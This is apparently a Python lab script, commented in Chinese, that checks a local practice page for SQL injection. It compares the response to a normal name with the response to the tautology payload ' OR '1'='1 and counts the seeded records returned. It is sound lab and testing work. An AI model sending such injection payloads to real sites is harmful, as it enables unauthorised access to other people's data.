#!/usr/bin/env python3
# S001 SQL 注入本地行为验证脚本
# 仅访问 127.0.0.1:4280，不修改数据库数据。

import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:4280/lab_cases/S001/index.php"
TIMEOUT = 5


def fetch(name: str):
    query = urllib.parse.urlencode({"name": name})
    url = f"{BASE_URL}?{query}"
    with urllib.request.urlopen(url, timeout=TIMEOUT) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body


def main():
    normal_name = "Alice"
    test_name = "' OR '1'='1"

    normal_status, normal_body = fetch(normal_name)
    test_status, test_body = fetch(test_name)

    normal_has_alice = "Alice" in normal_body
    normal_has_bob = "Bob" in normal_body
    normal_has_carol = "Carol" in normal_body

    test_has_alice = "Alice" in test_body
    test_has_bob = "Bob" in test_body
    test_has_carol = "Carol" in test_body

    print(f"普通输入 HTTP 状态: {normal_status}")
    print(f"普通输入包含 Alice/Bob/Carol: {normal_has_alice}/{normal_has_bob}/{normal_has_carol}")
    print(f"测试输入 HTTP 状态: {test_status}")
    print(f"测试输入包含 Alice/Bob/Carol: {test_has_alice}/{test_has_bob}/{test_has_carol}")

    # 成功条件基于正文记录变化，而不是 HTTP 200。
    confirmed = (
        normal_has_alice
        and not normal_has_bob
        and not normal_has_carol
        and test_has_alice
        and test_has_bob
        and test_has_carol
    )

    if confirmed:
        print("结果: 普通输入仅命中 Alice，测试输入命中全部预置记录，SQL 注入行为已确认。")
    else:
        print("结果: 未确认。请检查本地服务、db_connect.php、MariaDB、lab_people 预置数据和 URL 编码。")


if __name__ == "__main__":
    main()
